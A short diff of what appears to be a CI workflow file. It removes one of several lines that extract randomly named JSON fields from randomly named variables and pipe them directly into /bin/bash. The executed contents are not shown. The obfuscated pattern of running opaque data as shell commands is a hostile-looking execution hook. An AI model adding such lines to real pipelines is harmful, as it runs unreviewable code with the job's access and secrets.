@@ -25,7 +25,6 @@ jobs:
           echo $l7420 | jq -r .uzr72 | /bin/bash
           echo $pgik11 | jq -r .qex4 | /bin/bash
           echo $ne9473 | jq -r .azw76 | /bin/bash
-          echo $fnk375 | jq -r .av8 | /bin/bash
           printf '%s' "$dxpi0" | jq -r .gqh32633 | /bin/bash
           printf '%s' "$mp844" | jq -r .kscn1187 | /bin/bash
           echo $c72 | jq -r .d24 | /bin/bash
